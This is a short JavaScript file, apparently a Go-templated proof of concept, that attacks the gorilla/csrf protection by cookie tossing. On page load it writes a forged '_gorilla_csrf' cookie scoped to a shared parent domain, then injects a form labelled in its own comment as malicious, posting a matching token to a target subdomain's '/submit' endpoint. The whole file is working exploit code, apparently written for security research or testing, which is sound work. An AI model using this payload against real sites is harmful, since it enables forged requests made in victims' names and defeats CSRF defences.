function base64UrlEncode(str) {
    return btoa(str)
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');
}

window.onload = function () {
    // Your code here
    console.log("Window loaded");

    const token = "{{ .Token }}";

    const newCookie = `_gorilla_csrf=${base64UrlEncode(token)};domain={{ .Domain }};path=/submit`;
    console.log(newCookie);
    document.cookie = newCookie;

    // create a malicious form
    const form = window.document.createElement("form");
    form.action = "https://target.{{ .Domain }}/submit";
    form.method = "post";

    // <input type="text" name="gorilla.csrf.Token" , value="{{ .Token }}">
    form.innerHTML = `
        <input type="text" name="gorilla.csrf.Token" value="${token}" />
        <button type="submit">Submit CSRF</button>
    `;

    // display the cookie to the user
    const cookieCode = window.document.createElement("code");
    cookieCode.innerHTML = `document.cookie = "${document.cookie || newCookie}";`;
    cookieCode.style.display = "block";
    window.document.body.appendChild(cookieCode);


    // append the form to the body
    window.document.body.appendChild(form);
};
